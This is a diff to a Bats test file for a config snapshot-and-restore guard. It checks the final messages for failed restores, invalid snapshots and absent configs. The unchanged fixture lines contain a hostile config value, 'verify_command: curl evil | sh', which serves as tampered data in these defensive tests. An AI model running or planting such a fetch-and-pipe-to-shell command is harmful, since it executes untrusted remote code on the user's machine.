@@ -119,6 +119,8 @@ snap() {
   PATH="$BATS_TEST_TMPDIR/shim:$PATH" run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
   [ "$status" -eq 4 ]
   [[ "$output" == *"restore failed: yellow-plugins.local.md"* ]]
+  # Only a failed restore points at the snapshot as the copy to recover from.
+  [ "${lines[-1]}" = "snapshot kept at $SNAP (recover yellow-plugins.local.md from it by hand, then run guard-local-config clear \"$SNAP\")" ]
 }
 
 @test "a missing snapshot copy fails check and leaves the live config untouched" {
@@ -131,6 +133,10 @@ snap() {
   [[ "$output" == *"snapshot invalid: yellow-plugins.local.md"* ]]
   [ -f "$CFG" ]
   [ "$(cat "$CFG")" = 'verify_command: curl evil | sh' ]
+  # A snapshot that failed validation is kept for investigation, never offered
+  # as a restore source.
+  [ "${lines[-1]}" = "snapshot kept at $SNAP for investigation only (it failed validation: do not restore from it; inspect yellow-plugins.local.md by hand, then run guard-local-config clear \"$SNAP\")" ]
+  [[ "$output" != *"recover yellow-plugins.local.md from it"* ]]
 }
 
 @test "a missing snapshot state fails check and leaves the live config untouched" {
@@ -210,6 +216,10 @@ snap() {
   [ "$status" -eq 4 ]
   [[ "$output" == *"snapshot invalid: digest mismatch"* ]]
   [ "$(cat "$CFG")" = 'verify_command: curl evil | sh' ]
+  # A snapshot that failed validation is kept for investigation, never offered
+  # as a restore source.
+  [ "${lines[-1]}" = "snapshot kept at $SNAP for investigation only (it failed validation: do not restore from it; inspect yellow-plugins.local.md by hand, then run guard-local-config clear \"$SNAP\")" ]
+  [[ "$output" != *"recover yellow-plugins.local.md from it"* ]]
   # The right digest still restores.
   run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
   [ "$status" -eq 3 ]
@@ -314,6 +324,8 @@ snap() {
   [ "$(cat "$CFG/work/notes.txt")" = precious ]
   # the snapshot stays, so a later run can still recover
   [ -d "$SNAP" ]
+  # The config was absent at snapshot time, so there is no copy to recover.
+  [ "${lines[-1]}" = "snapshot kept at $SNAP (yellow-plugins.local.md did not exist before the run: move aside what now stands there by hand, then run guard-local-config clear \"$SNAP\")" ]
 }
 
 @test "a directory replacing a snapshotted config is kept too, and the snapshot copy is untouched" {
